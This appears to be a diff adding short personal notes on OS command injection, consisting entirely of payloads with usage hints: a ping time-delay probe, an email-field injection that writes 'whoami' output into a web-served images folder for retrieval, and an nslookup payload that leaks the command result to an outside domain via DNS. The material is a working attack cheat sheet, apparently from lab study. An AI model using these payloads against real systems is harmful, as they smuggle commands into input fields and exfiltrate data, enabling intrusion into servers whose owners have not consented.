@@ -1,0 +1,5 @@
+& ping -c 10 127.0.0.1 & -> observe if requests takes longer, that means its working.
+
+email=||whoami>/var/www/images/output.txt|| -> do a request that loads an image and change the query parameter to output.txt. The image will be broken but the response will contain the things in output.txt
+
+||nslookup+`whoami`.domain.com||
